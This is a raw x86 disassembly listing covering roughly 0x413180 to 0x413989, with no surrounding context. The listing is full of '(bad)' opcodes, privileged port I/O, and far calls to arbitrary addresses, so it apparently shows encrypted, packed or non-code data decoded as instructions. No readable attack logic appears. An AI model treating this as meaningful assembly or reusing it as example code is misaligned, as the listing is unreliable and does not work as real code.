  413180:	push   0xae5dd92f
  413185:	call   0x370b7f33
  41318a:	jge    0x4131ed
  41318c:	jae    0x41315d
  41318e:	push   eax
  41318f:	mov    DWORD PTR [edx+0x6207e8dd],esi
  413195:	inc    edx
  413196:	adc    al,0xdb
  413198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413199:	mov    dl,0xd7
  41319b:	imul   esi,edx,0x88029d42
  4131a1:	fst    QWORD PTR [edi]
  4131a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131a4:	jnp    0x4131af
  4131a6:	leave  
  4131a7:	mov    ah,0xf7
  4131a9:	pop    esi
  4131aa:	outs   dx,BYTE PTR ds:[esi]
  4131ab:	test   al,0xdf
  4131ad:	ss jl  0x4131c9
  4131b0:	repnz lea esi,[ecx-0x3dd12dc7]
  4131b7:	inc    esi
  4131b8:	sub    al,0xdb
  4131ba:	nop
  4131bb:	scas   eax,DWORD PTR es:[edi]
  4131bc:	ss daa 
  4131be:	sar    bh,0xf6
  4131c1:	mov    ebp,0x9f14998b
  4131c6:	pop    eax
  4131c7:	sahf   
  4131c8:	xchg   BYTE PTR [ebp-0x70],cl
  4131cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131cc:	mov    dh,0xc5
  4131ce:	mov    WORD PTR [edi],ss
  4131d0:	popf   
  4131d1:	fidivr WORD PTR [ebp+0x4b13c363]
  4131d7:	(bad)  
  4131d8:	(bad)  
  4131da:	pop    edi
  4131db:	pop    ebp
  4131dc:	mov    dl,BYTE PTR [ecx+0x9]
  4131df:	test   eax,0x519f3fd9
  4131e4:	sub    bl,BYTE PTR ss:[edx+0x5d]
  4131e8:	out    dx,al
  4131e9:	dec    ecx
  4131ea:	call   0x964c:0x2c85399f
  4131f1:	push   esi
  4131f2:	add    al,0xcd
  4131f4:	into   
  4131f5:	aad    0x50
  4131f7:	inc    ecx
  4131f8:	jnp    0x413253
  4131fa:	mov    ?,WORD PTR [ecx-0x616c3aec]
  413200:	imul   edx,DWORD PTR [eax],0x914904b4
  413206:	loop   0x4131f6
  413208:	adc    DWORD PTR [ebp-0x25],ebp
  41320b:	inc    ebx
  41320c:	call   0x538b0b53
  413211:	nop
  413212:	or     al,0x33
  413214:	sbb    DWORD PTR [esi-0x60be9619],edx
  41321a:	test   DWORD PTR [ebx-0x59],ecx
  41321d:	in     eax,0x31
  41321f:	dec    edi
  413220:	add    BYTE PTR [eax+ebx*4+0x4adde56e],0xb6
  413228:	enter  0xcd5,0x8c
  41322c:	inc    ebx
  41322d:	adc    al,0x78
  41322f:	pop    eax
  413230:	loopne 0x41327a
  413232:	retf   0x1762
  413235:	mov    eax,edi
  413237:	retf   0xa464
  41323a:	es out dx,al
  41323c:	ins    DWORD PTR es:[edi],dx
  41323d:	add    DWORD PTR [eax],0x82a70505
  413243:	in     al,dx
  413244:	sub    bl,BYTE PTR [ecx+ebx*2]
  413247:	data16 jbe 0x41323b
  41324a:	xchg   ebp,eax
  41324b:	clc    
  41324c:	sub    eax,0xad38b482
  413251:	and    ecx,DWORD PTR [ebx]
  413253:	jno    0x41328c
  413255:	adc    DWORD PTR [edi+0x5fa1620f],esi
  41325b:	and    edi,edx
  41325d:	inc    ebp
  41325e:	test   DWORD PTR [esi+0x69d21c5d],ebx
  413264:	test   al,0x63
  413266:	test   BYTE PTR [ecx],0x5
  413269:	les    ecx,FWORD PTR [edx]
  41326b:	adc    al,0x46
  41326d:	xchg   ebx,eax
  41326e:	mov    gs,WORD PTR [esi]
  413270:	nop
  413271:	loopne 0x41329e
  413273:	lods   eax,DWORD PTR ds:[esi]
  413274:	fsubr  QWORD PTR [edx]
  413276:	jl     0x149eaade
  41327c:	sbb    al,0x68
  41327e:	xor    DWORD PTR [edi-0x43d3f9f2],edx
  413284:	adc    cl,BYTE PTR [ebp+0x17]
  413287:	pop    esp
  413288:	mov    esi,0x8ae1d3f4
  41328d:	stos   BYTE PTR es:[edi],al
  41328e:	mov    dl,0x59
  413290:	xor    al,0x9b
  413292:	xor    eax,0x326f67b6
  413297:	mov    DWORD PTR ds:0xf7e76ceb,edi
  41329d:	in     eax,0x1
  41329f:	cmp    dl,BYTE PTR [eax]
  4132a1:	ins    BYTE PTR es:[edi],dx
  4132a2:	push   ecx
  4132a3:	xchg   ebx,eax
  4132a4:	push   edi
  4132a5:	push   esp
  4132a6:	sub    DWORD PTR [ecx],edx
  4132a8:	pop    ecx
  4132a9:	sub    ebp,DWORD PTR [edi]
  4132ab:	das    
  4132ac:	jne    0x4132e7
  4132ae:	outs   dx,BYTE PTR ds:[esi]
  4132af:	mov    al,ds:0xae2bfbab
  4132b4:	xor    BYTE PTR [ecx+0x65],ch
  4132b7:	rcl    DWORD PTR [ecx+0x4848220],cl
  4132bd:	ja     0x4132fe
  4132bf:	addr16 pop ds
  4132c1:	mov    al,0xa4
  4132c3:	mov    cl,0xfc
  4132c5:	xchg   ecx,eax
  4132c6:	test   DWORD PTR [ebx],ecx
  4132c8:	iret   
  4132c9:	xchg   DWORD PTR [esi+0x6c],eax
  4132cc:	loope  0x413322
  4132ce:	mov    ch,0x82
  4132d0:	gs mov eax,0xe6278a9a
  4132d6:	addr16 push eax
  4132d8:	and    DWORD PTR [eax+0x4b7b9f64],ecx
  4132de:	lods   eax,DWORD PTR ds:[esi]
  4132df:	sbb    BYTE PTR [edx-0x80],bh
  4132e2:	bound  esi,QWORD PTR [eax-0x60cc5f37]
  4132e8:	adc    ebp,DWORD PTR [esi-0x50541d55]
  4132ee:	mov    edi,DWORD PTR [esp+ebx*2+0x1aa46b4d]
  4132f5:	inc    ebp
  4132f6:	loope  0x413359
  4132f8:	mov    ah,0x81
  4132fa:	repz mov ebp,0x61e7df60
  413300:	in     al,0x81
  413302:	adc    ah,ch
  413304:	mov    dl,0xab
  413306:	cmp    BYTE PTR [edi],bl
  413308:	test   ebp,ebx
  41330a:	or     al,0xd4
  41330c:	xchg   ecx,eax
  41330d:	or     al,0x9a
  41330f:	in     eax,0x34
  413311:	and    al,0x67
  413313:	(bad)  
  413314:	sub    ecx,ebp
  413316:	or     ebp,DWORD PTR [ebx-0x17]
  413319:	pop    ebx
  41331a:	cmp    esi,DWORD PTR es:[edi+0x54]
  41331e:	sub    BYTE PTR [ecx],ah
  413320:	pop    ebx
  413321:	pop    esi
  413322:	mov    cl,0xd
  413324:	mov    eax,0x9aa29e0a
  413329:	ss inc edi
  41332b:	dec    ebp
  41332c:	pop    ss
  41332d:	mov    eax,ds:0x57f4befb
  413332:	in     eax,dx
  413333:	fcomp  DWORD PTR [edi+0x6e5f43c3]
  413339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41333a:	das    
  41333b:	xchg   edi,eax
  41333c:	xchg   ebp,eax
  41333d:	out    0x65,al
  41333f:	lahf   
  413340:	(bad)  
  413341:	xchg   ebx,eax
  413342:	fnstsw WORD PTR [ecx-0x6f8a41fb]
  413348:	cmp    cl,dh
  41334a:	rol    ch,0xd
  41334d:	in     al,dx
  41334e:	jns    0x4133c9
  413350:	mov    dh,BYTE PTR [edx]
  413352:	adc    eax,0xd6d042da
  413357:	aaa    
  413358:	clc    
  413359:	xor    edi,DWORD PTR [ebp+eiz*4-0x272e1125]
  413360:	rol    DWORD PTR [edi-0x66],cl
  413363:	dec    ebp
  413364:	push   0x12
  413366:	sub    BYTE PTR [ecx+0x7d],bl
  413369:	jp     0x413321
  41336b:	data16 loop 0x41336b
  41336e:	fstp   TBYTE PTR [ebx+edx*4]
  413371:	ret    
  413372:	push   cs
  413373:	push   es
  413374:	fnstenv [ebp+edx*4+0x7aebf37d]
  41337b:	pop    edi
  41337c:	out    0xe2,al
  41337e:	sbb    eax,0x6a9c764f
  413383:	push   cs
  413384:	cmp    al,0x16
  413386:	inc    ebx
  413387:	je     0x413371
  413389:	and    ah,BYTE PTR [edx+0x30e5c641]
  41338f:	push   ebp
  413390:	ins    DWORD PTR es:[edi],dx
  413391:	or     bh,ah
  413393:	mov    ?,WORD PTR [ebx-0x7c]
  413396:	std    
  413397:	sbb    dh,BYTE PTR [esi-0x7]
  41339a:	fistp  DWORD PTR [ebx-0x35]
  41339d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41339f:	sahf   
  4133a0:	adc    BYTE PTR [edx],ah
  4133a2:	retf   0xa0b5
  4133a5:	lea    esp,[edi]
  4133a7:	lods   eax,DWORD PTR ds:[esi]
  4133a8:	sub    al,0xaf
  4133aa:	mov    bh,0xfd
  4133ac:	ficom  DWORD PTR [esi-0x3e]
  4133af:	fs cmp eax,0x5fad6149
  4133b5:	sub    ecx,DWORD PTR [ebx-0x2]
  4133b8:	sub    edx,DWORD PTR [ecx+eiz*8+0x5f1b4d10]
  4133bf:	loopne 0x413386
  4133c1:	aad    0x9f
  4133c3:	dec    BYTE PTR [esi+0x6bbe5cce]
  4133c9:	fcom   DWORD PTR [ecx-0x7e89d6e5]
  4133cf:	dec    ecx
  4133d0:	popa   
  4133d1:	call   0x3ffd8423
  4133d6:	pop    esp
  4133d7:	add    al,0x80
  4133d9:	pop    es
  4133da:	(bad)  
  4133db:	xlat   BYTE PTR ds:[ebx]
  4133dc:	rcl    ebx,0xd1
  4133df:	inc    edx
  4133e0:	fwait
  4133e1:	mov    ds:0x9504a854,eax
  4133e6:	les    edx,FWORD PTR [ebx-0x648c8c2c]
  4133ec:	mov    bl,0xc6
  4133ee:	fld    DWORD PTR [ecx-0xbea432f]
  4133f4:	scas   al,BYTE PTR es:[edi]
  4133f5:	and    BYTE PTR [edi],bl
  4133f7:	push   0x6a
  4133f9:	(bad)  
  4133fa:	div    BYTE PTR [edx-0x54]
  4133fd:	(bad)  
  4133ff:	std    
  413400:	push   ecx
  413401:	cmp    DWORD PTR [edx-0x71],edx
  413404:	dec    BYTE PTR [edx-0x14]
  413407:	mov    ds:0xfdd968b4,al
  41340c:	outs   dx,DWORD PTR ds:[esi]
  41340d:	mov    bl,0xec
  41340f:	jae    0x413424
  413411:	jecxz  0x413456
  413413:	repz or esp,0x4a
  413417:	mul    BYTE PTR ds:0x32b5ccf2
  41341d:	test   DWORD PTR [ecx+0x76],0x8de80b11
  413424:	(bad)  
  413425:	dec    eax
  413426:	jg     0x41341f
  413428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413429:	sbb    esi,ebp
  41342b:	mov    ds:0xaa677118,eax
  413430:	jecxz  0x413425
  413432:	mov    dh,0xca
  413434:	int3   
  413435:	cmp    al,0xe5
  413437:	daa    
  413438:	jbe    0x41343c
  41343a:	xchg   DWORD PTR [edx-0x67],edi
  41343d:	ret    
  41343e:	xchg   ecx,eax
  41343f:	test   BYTE PTR [ebx+0x1015ba31],bl
  413445:	je     0x4133f4
  413447:	inc    esp
  413448:	frstor [ebx-0x3]
  41344b:	inc    edx
  41344c:	in     al,dx
  41344d:	test   BYTE PTR [ebx],dl
  41344f:	cmc    
  413450:	outs   dx,BYTE PTR ds:[esi]
  413451:	mov    ebx,0xd1dd1061
  413456:	icebp  
  413457:	sbb    dh,BYTE PTR [ecx-0x57]
  41345a:	call   0xaa8dc5f7
  41345f:	push   es
  413460:	mov    ecx,0xb469d5d6
  413465:	retf   
  413466:	loope  0x4134a0
  413468:	sbb    esi,DWORD PTR [edx-0xa]
  41346b:	fcmovbe st,st(6)
  41346d:	or     eax,0xdf913268
  413472:	imul   edx,DWORD PTR [esi-0x269120dd],0x335acf16
  41347c:	icebp  
  41347d:	jns    0x4134cd
  41347f:	addr16 xor eax,0xac07db59
  413485:	mov    dh,0xda
  413487:	loope  0x4134c2
  413489:	xor    DWORD PTR [ebx+0x3128a000],0x69db7a5a
  413493:	out    dx,al
  413494:	test   al,0xe5
  413496:	xor    esp,DWORD PTR [ebx]
  413498:	cmp    eax,0xb54d9a39
  41349d:	adc    al,0x9f
  41349f:	scas   eax,DWORD PTR es:[edi]
  4134a0:	imul   esp,DWORD PTR [ebp-0x4c],0x4fc94544
  4134a7:	and    eax,0x39d285d6
  4134ac:	inc    esp
  4134ad:	push   esi
  4134ae:	fnstsw ax
  4134b0:	rcr    BYTE PTR [ecx+0x7],1
  4134b3:	das    
  4134b4:	test   DWORD PTR [esi+0x337de713],ebx
  4134ba:	ror    DWORD PTR [esi+0x6b],1
  4134bd:	retf   0x92fb
  4134c0:	or     al,0xba
  4134c2:	fidivr DWORD PTR [edi]
  4134c4:	outs   dx,BYTE PTR ds:[esi]
  4134c5:	aam    0xab
  4134c7:	jb     0x41351e
  4134c9:	jnp    0x413502
  4134cb:	test   DWORD PTR [eax+edi*8-0x7f],0x5ee18d65
  4134d3:	aam    0xa1
  4134d5:	add    al,0x44
  4134d7:	pop    ebx
  4134d8:	inc    esp
  4134d9:	ret    0xa20e
  4134dc:	dec    esp
  4134dd:	js     0x41350b
  4134df:	adc    al,0xc1
  4134e1:	mov    ebp,0xf5f19ce2
  4134e6:	hlt    
  4134e7:	mov    esi,DWORD PTR [eax]
  4134e9:	mov    al,ds:0xf935fea7
  4134ee:	cmp    ch,BYTE PTR [ecx+0x2e]
  4134f1:	push   ecx
  4134f2:	fcmovnu st,st(0)
  4134f4:	(bad)  
  4134f5:	loopne 0x4134a8
  4134f7:	cmp    eax,DWORD PTR [ecx+0x4c]
  4134fa:	sbb    BYTE PTR [edi-0x73],0xb
  4134fe:	push   ebp
  4134ff:	and    BYTE PTR [edi],dh
  413501:	mov    ds:0x916538cf,eax
  413506:	fdiv   st(1),st
  413508:	pop    ds
  413509:	mov    WORD PTR [eax-0x22e7229a],ds
  41350f:	push   ebx
  413510:	push   ds
  413511:	dec    ebx
  413512:	les    esi,FWORD PTR [ecx]
  413514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413515:	jo     0x413577
  413517:	sub    ch,BYTE PTR [ecx+eax*1-0x3b]
  41351b:	aad    0x50
  41351d:	stc    
  41351e:	push   eax
  41351f:	push   ebx
  413520:	xor    ebx,0x7a9549be
  413526:	enter  0x8121,0x17
  41352a:	ss xor edi,edi
  41352d:	push   eax
  41352e:	inc    esp
  41352f:	mov    esp,0x53f968c2
  413534:	xor    eax,0xe978af6f
  413539:	xchg   ebp,eax
  41353a:	lds    edx,FWORD PTR [edi]
  41353c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41353d:	push   0x9cf9bae6
  413542:	rcr    BYTE PTR [ebx+edx*4],0xe2
  413546:	push   esi
  413547:	aas    
  413548:	push   ds
  413549:	jne    0x413561
  41354b:	sub    eax,0x7c8535cd
  413550:	cli    
  413551:	mov    dh,0x6f
  413553:	loope  0x413593
  413555:	jno    0x413527
  413557:	add    DWORD PTR [ebx],eax
  413559:	and    esp,edx
  41355b:	push   0xecfed031
  413560:	mov    esi,esi
  413562:	jne    0x413522
  413564:	test   esi,esp
  413566:	mov    bl,0x28
  413568:	leave  
  413569:	(bad)  
  41356a:	stc    
  41356b:	test   DWORD PTR [edx+0x12],0x6d20c47
  413572:	jo     0x413568
  413574:	es cld 
  413576:	inc    esi
  413577:	jne    0x4135de
  413579:	mov    ?,ebp
  41357b:	ror    DWORD PTR [edx-0x77e6903d],1
  413581:	cmc    
  413582:	f2xm1  
  413584:	stos   DWORD PTR es:[edi],eax
  413585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413586:	push   ss
  413587:	adc    bh,BYTE PTR [ebx+0x68eada44]
  41358d:	jg     0x41359e
  41358f:	mov    eax,0xbcbb75df
  413594:	aam    0x16
  413596:	xchg   ebx,eax
  413597:	xor    eax,0x3dabb29d
  41359c:	int3   
  41359d:	hlt    
  41359e:	jb     0x4135e8
  4135a0:	ret    0x238e
  4135a3:	ret    
  4135a4:	out    0x69,al
  4135a6:	pop    esi
  4135a7:	js     0x4135cb
  4135a9:	pop    ss
  4135aa:	pushf  
  4135ab:	and    DWORD PTR [esi+0xc],edi
  4135ae:	mov    dl,0x66
  4135b0:	std    
  4135b1:	int    0x57
  4135b3:	mov    WORD PTR [eax+0xa],?
  4135b6:	aaa    
  4135b7:	add    ecx,DWORD PTR [eax]
  4135b9:	dec    esp
  4135ba:	retf   0x1503
  4135bd:	cwde   
  4135be:	mov    esp,0x476ea003
  4135c3:	inc    ecx
  4135c4:	in     eax,dx
  4135c5:	(bad)  
  4135c6:	imul   esi,DWORD PTR [esi+eiz*2-0x7d],0x21
  4135cb:	or     bh,bh
  4135cd:	jl     0x413605
  4135cf:	inc    edi
  4135d0:	xor    eax,0x51ae96ff
  4135d5:	gs icebp 
  4135d7:	push   esp
  4135d8:	loope  0x4135d2
  4135da:	or     eax,0xe08d9a98
  4135df:	jecxz  0x4135b4
  4135e1:	rcl    BYTE PTR [edx+0x61],0x29
  4135e5:	(bad)  
  4135e6:	jp     0x4135bc
  4135e8:	mov    fs,WORD PTR [edi]
  4135ea:	repnz adc BYTE PTR [eax],bh
  4135ed:	mov    ds:0xbd36b57,eax
  4135f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135f3:	xor    BYTE PTR [ecx+0x32005490],dh
  4135f9:	dec    ebx
  4135fa:	shl    ecx,0x4
  4135fd:	sbb    BYTE PTR [ecx-0x2b1a791d],0xe7
  413604:	fidiv  DWORD PTR [ebx+0xfee89ea]
  41360a:	les    ebp,FWORD PTR [edx+0x2cc13e93]
  413610:	mov    ebx,0xdd0198aa
  413615:	retf   0xfaa4
  413618:	imul   esp,esi,0x55
  41361b:	mov    bl,0x2e
  41361d:	mov    BYTE PTR [edi+0x1f9b2c6b],bl
  413623:	xchg   edx,esp
  413625:	dec    edx
  413626:	dec    edx
  413627:	xchg   ecx,eax
  413628:	ins    BYTE PTR es:[edi],dx
  413629:	or     eax,0xafe7b68
  41362e:	pop    ecx
  41362f:	adc    al,0xe
  413631:	mov    edx,0x99c00609
  413636:	or     edi,ebx
  413638:	jno    0x4135d4
  41363a:	ror    BYTE PTR [ebp-0x24],0x10
  41363e:	ja     0x41365a
  413640:	sub    BYTE PTR [edi-0x7abc1da1],ah
  413646:	outs   dx,DWORD PTR ds:[esi]
  413647:	jmp    0x76c9:0x96766b0a
  41364e:	icebp  
  41364f:	jmp    0xec6c27e2
  413654:	jecxz  0x4136aa
  413656:	dec    ebx
  413657:	call   DWORD PTR [eax]
  41365a:	dec    esp
  41365b:	in     eax,dx
  41365c:	loop   0x413658
  41365e:	cmc    
  41365f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413660:	and    ch,bh
  413662:	pop    ds
  413663:	(bad)  
  413664:	cmp    BYTE PTR ds:0x59f19b9b,dl
  41366a:	cld    
  41366b:	out    0x15,al
  41366d:	aad    0xc0
  41366f:	fsub   QWORD PTR [ebp+0x6f]
  413672:	pop    ebx
  413673:	sbb    esp,esi
  413675:	int    0x8f
  413677:	lock inc esp
  413679:	call   0x73d4:0xbbb15969
  413680:	icebp  
  413681:	and    al,0x9f
  413683:	lods   al,BYTE PTR ds:[esi]
  413684:	psubusw mm1,QWORD PTR [esi+eiz*8-0x3d3caf7a]
  41368c:	in     al,dx
  41368d:	mov    ds:0x9873d70f,eax
  413692:	and    DWORD PTR [ecx+ebp*1],ebx
  413695:	fimul  WORD PTR [ecx]
  413697:	add    eax,0x2d80231a
  41369c:	aas    
  41369d:	mov    BYTE PTR [edx+0x7812a35f],0x4
  4136a4:	or     edi,esp
  4136a6:	icebp  
  4136a7:	int    0x61
  4136a9:	stc    
  4136aa:	adc    bh,bl
  4136ac:	sub    eax,0xdcde58f9
  4136b1:	xor    ch,BYTE PTR [edx+edx*1+0x16eb5575]
  4136b8:	jne    0x413671
  4136ba:	sbb    ecx,0x84dd9a37
  4136c0:	stos   DWORD PTR es:[edi],eax
  4136c1:	adc    esp,DWORD PTR [esi]
  4136c3:	sar    BYTE PTR [esp+esi*2+0x7440d04],cl
  4136ca:	mov    esp,0x4e940380
  4136cf:	mov    dl,0xda
  4136d1:	mov    dh,0x38
  4136d3:	adc    edx,edx
  4136d5:	inc    edi
  4136d6:	(bad)  
  4136d7:	in     al,0xf5
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	mov    esp,DWORD PTR [esi-0x3e]
  4136de:	into   
  4136df:	stos   DWORD PTR es:[edi],eax
  4136e0:	push   edx
  4136e1:	jmp    FWORD PTR [edi]
  4136e3:	lods   eax,DWORD PTR ds:[esi]
  4136e4:	adc    ah,BYTE PTR [eax]
  4136e6:	sbb    ebp,DWORD PTR [ecx+ebp*2]
  4136e9:	push   cs
  4136ea:	sub    BYTE PTR [edi-0x42ea33d9],dh
  4136f0:	scas   eax,DWORD PTR es:[edi]
  4136f1:	popa   
  4136f2:	in     al,0x60
  4136f4:	into   
  4136f5:	cdq    
  4136f6:	inc    eax
  4136f7:	pop    es
  4136f8:	jae    0x4136e9
  4136fa:	mov    dh,0xf7
  4136fc:	imul   ecx,esi,0x2a
  4136ff:	dec    edx
  413700:	mov    ecx,0xc13352e
  413705:	xchg   esp,eax
  413706:	sub    BYTE PTR [ebx+0x4cd72c38],0xfd
  41370d:	lods   al,BYTE PTR ds:[esi]
  41370e:	pop    edx
  41370f:	sub    DWORD PTR [ecx],esp
  413711:	es mov ebp,0x468f90f4
  413717:	cmc    
  413718:	mul    BYTE PTR [esi+0x4b]
  41371b:	or     DWORD PTR [esi-0x1f2e3fc5],esi
  413721:	pop    esp
  413722:	push   0xf3524faa
  413727:	outs   dx,DWORD PTR ds:[esi]
  413728:	or     ah,cl
  41372a:	xchg   ebx,eax
  41372b:	ror    DWORD PTR [eax+0x5f26ee11],0x2d
  413732:	pop    ss
  413733:	clc    
  413734:	call   FWORD PTR [ebp-0x262e9678]
  41373a:	stc    
  41373b:	xchg   esi,eax
  41373c:	cmp    DWORD PTR [ecx-0x4f64a93c],0xffffff9c
  413743:	cmc    
  413744:	shl    BYTE PTR [edx-0x5f],1
  413747:	cmp    al,0x57
  413749:	jnp    0x413780
  41374b:	adc    esp,DWORD PTR [esi]
  41374d:	pop    esp
  41374e:	push   ebx
  41374f:	mov    ebp,0x355591ce
  413754:	scas   eax,DWORD PTR es:[edi]
  413755:	test   BYTE PTR ds:0xf3d9db28,0xa2
  41375c:	mov    ds:0x63a52c14,al
  413761:	nop
  413762:	mov    bl,BYTE PTR [ebx+ebx*8-0x6a]
  413766:	jne    0x41372e
  413768:	aam    0x42
  41376a:	jno    0x413778
  41376c:	out    0x78,al
  41376e:	inc    ecx
  41376f:	mov    es,WORD PTR [edx-0x3d8dce74]
  413775:	jle    0x413735
  413777:	add    al,0x77
  413779:	or     BYTE PTR [eax-0x692426cd],dl
  41377f:	fwait
  413780:	xchg   edi,eax
  413781:	(bad)  
  413782:	test   eax,0xddfba9c9
  413787:	scas   al,BYTE PTR es:[edi]
  413788:	fld    TBYTE PTR [esi+0x35801382]
  41378e:	pop    ecx
  41378f:	retf   0x29b
  413792:	or     BYTE PTR [ecx+ecx*1-0x47],cl
  413796:	jmp    0x53fdc4e5
  41379b:	mov    esp,0xec1b9414
  4137a0:	pop    esp
  4137a1:	pushf  
  4137a2:	call   DWORD PTR [esi+edi*1-0x66084483]
  4137a9:	or     BYTE PTR [ecx],0x88
  4137ac:	out    0xa1,al
  4137ae:	ror    dh,0xbe
  4137b1:	not    DWORD PTR [ecx]
  4137b3:	sbb    eax,0xdfc6cebf
  4137b8:	mov    dl,0xe6
  4137ba:	fst    QWORD PTR [eax+ebx*4-0x45d81908]
  4137c1:	cmp    eax,0x97d8864f
  4137c6:	pop    ecx
  4137c7:	addps  xmm3,XMMWORD PTR [edx+esi*4]
  4137cb:	sti    
  4137cc:	cmp    al,0xdf
  4137ce:	rcl    BYTE PTR [edi],cl
  4137d0:	mov    ah,0x3d
  4137d2:	call   0x3ea9:0x3dd13974
  4137d9:	shl    BYTE PTR [esi],cl
  4137db:	popf   
  4137dc:	repz icebp 
  4137de:	and    bh,BYTE PTR [ebp-0xc]
  4137e1:	fdivr  st(5),st
  4137e3:	(bad)  
  4137e4:	icebp  
  4137e5:	dec    edx
  4137e6:	xor    BYTE PTR [edx],0x7c
  4137e9:	jbe    0x413778
  4137eb:	mov    ebx,0xd0eecd00
  4137f0:	jmp    DWORD PTR [edi-0x6b7e87cc]
  4137f6:	xchg   DWORD PTR [edx-0x20],ebp
  4137f9:	test   al,0x32
  4137fb:	and    DWORD PTR [ebp+ecx*1+0x3c8c51a3],ebp
  413802:	dec    esi
  413803:	xor    eax,0xe7e588ff
  413808:	push   cs
  413809:	pop    ebp
  41380a:	xchg   edi,eax
  41380b:	fadd   DWORD PTR [eax]
  41380d:	fwait
  41380e:	leave  
  41380f:	xchg   DWORD PTR [eax-0x1c],eax
  413812:	adc    ax,WORD PTR ds:0xd4981490
  413819:	fs pop ss
  41381b:	lods   al,BYTE PTR ds:[esi]
  41381c:	test   al,0x7a
  41381e:	jmp    0x4d47:0x30707d8b
  413825:	mov    al,0x9d
  413827:	mov    al,0x34
  413829:	dec    esp
  41382a:	neg    ah
  41382c:	out    dx,al
  41382d:	pop    es
  41382e:	repnz aam 0x13
  413831:	imul   edi,DWORD PTR [esi+0x7f9d1c7d],0xffffffff
  413838:	mov    ds:0x256059e0,al
  41383d:	push   esp
  41383e:	dec    esi
  41383f:	sub    ch,BYTE PTR [eax]
  413841:	je     0x41381b
  413843:	sbb    ebp,edx
  413845:	sti    
  413846:	mov    eax,0x741fe47c
  41384b:	and    ch,al
  41384d:	call   0xea76:0x6625d471
  413854:	icebp  
  413855:	test   al,0x7e
  413857:	add    eax,0x2925ab28
  41385c:	pop    ecx
  41385d:	loop   0x4137e1
  41385f:	push   eax
  413860:	and    al,0xed
  413862:	or     bh,BYTE PTR [edi+edi*2-0x49cc58cd]
  413869:	mov    bh,BYTE PTR [ecx+0x158665cc]
  41386f:	pop    ss
  413870:	jl     0x413804
  413872:	arpl   WORD PTR [edi+0x1997c33b],bx
  413878:	push   ecx
  413879:	das    
  41387a:	fstp   QWORD PTR [ebp-0xe]
  41387d:	cli    
  41387e:	enter  0x3d5e,0xa2
  413882:	sub    DWORD PTR [edi-0x38904fc],ecx
  413888:	sbb    ah,BYTE PTR [edi+0x1b]
  41388b:	pop    ds
  41388c:	rol    DWORD PTR [edx+0x6f2bf8c],cl
  413892:	add    al,BYTE PTR [ebp+0x1b4da596]
  413898:	imul   eax,DWORD PTR [ebp+0xfd83f1d],0xfffffffa
  41389f:	shr    DWORD PTR [esi+0x60],1
  4138a2:	xchg   edi,eax
  4138a3:	dec    ebx
  4138a4:	fcmovnbe st,st(5)
  4138a6:	repz imul ebp,ebx,0xffffffa3
  4138aa:	dec    esi
  4138ab:	(bad)  
  4138ac:	mov    esp,0x9e61719c
  4138b1:	xor    esi,ebx
  4138b3:	cdq    
  4138b4:	dec    esi
  4138b5:	xor    DWORD PTR [edi-0x7b],0x1
  4138b9:	cld    
  4138ba:	mov    eax,DWORD PTR [edx-0x78]
  4138bd:	push   cs
  4138be:	dec    ecx
  4138bf:	push   esi
  4138c0:	lahf   
  4138c1:	mov    al,0x61
  4138c3:	retf   0x2c59
  4138c6:	shl    esp,cl
  4138c8:	and    BYTE PTR [ecx+0x25],bh
  4138cb:	stos   DWORD PTR es:[edi],eax
  4138cc:	push   ebx
  4138cd:	or     ebx,DWORD PTR [esi]
  4138cf:	push   edx
  4138d0:	mov    ebx,0xb4b13050
  4138d5:	add    ch,BYTE PTR [edx+0x46]
  4138d8:	jae    0x41391e
  4138da:	cmp    ebx,0x1763863e
  4138e0:	aad    0x1c
  4138e2:	fcmove st,st(3)
  4138e4:	popa   
  4138e5:	repz dec edi
  4138e7:	sar    BYTE PTR [ecx],cl
  4138e9:	push   ds
  4138ea:	jbe    0x41395c
  4138ec:	rcl    DWORD PTR [ecx-0x2c166e00],cl
  4138f2:	lea    esi,ds:0x6424c429
  4138f8:	loop   0x41394d
  4138fa:	lock mov si,0x8274
  4138ff:	fcom   QWORD PTR [ebx]
  413901:	aas    
  413902:	mov    ds:0x565f95b9,al
  413907:	inc    ecx
  413908:	mov    ebp,0xf9a1657d
  41390d:	imul   esi,DWORD PTR [ebx*1-0x1bc69b74],0x1515ac72
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	stos   DWORD PTR es:[edi],eax
  41391a:	push   ebp
  41391b:	out    0x45,al
  41391d:	imul   edi,DWORD PTR [esi+ecx*2-0x39],0xffffff8b
  413922:	or     BYTE PTR [edi+eiz*8],dl
  413925:	jo     0x413937
  413927:	loopne 0x4138e7
  413929:	dec    eax
  41392a:	fucomp st(4)
  41392c:	outs   dx,BYTE PTR ds:[esi]
  41392d:	jb     0x4138c5
  41392f:	test   eax,0x97ee2e45
  413934:	mov    eax,ds:0xb57a99e5
  413939:	cmc    
  41393a:	mov    al,0x1a
  41393c:	int3   
  41393d:	push   eax
  41393e:	cmp    ebx,DWORD PTR [esi-0x586f66bf]
  413944:	ds inc edx
  413946:	out    dx,al
  413947:	mov    bh,0x32
  413949:	outs   dx,DWORD PTR ds:[esi]
  41394a:	dec    DWORD PTR [ebx+0x47]
  41394d:	loope  0x413905
  41394f:	pop    eax
  413950:	add    esp,ecx
  413952:	cmp    dh,ah
  413954:	cmp    eax,0x8ab5903f
  413959:	adc    al,0x8c
  41395b:	pop    edi
  41395c:	adc    BYTE PTR [edi-0x5cac7a80],cl
  413962:	add    eax,0xc0403042
  413967:	or     BYTE PTR [esi-0x1e93b284],bl
  41396d:	int    0x62
  41396f:	imul   eax,DWORD PTR [edx],0xa372246d
  413975:	xor    al,0x9c
  413977:	push   ecx
  413978:	sahf   
  413979:	retf   0xa569
  41397c:	call   0x6fb0:0x791669ff
  413983:	jecxz  0x41393f
  413985:	lds    edx,FWORD PTR [eax]
  413987:	int    0x77
  413989:	mov    WORD PTR [ebx+0x142b48a7],cs
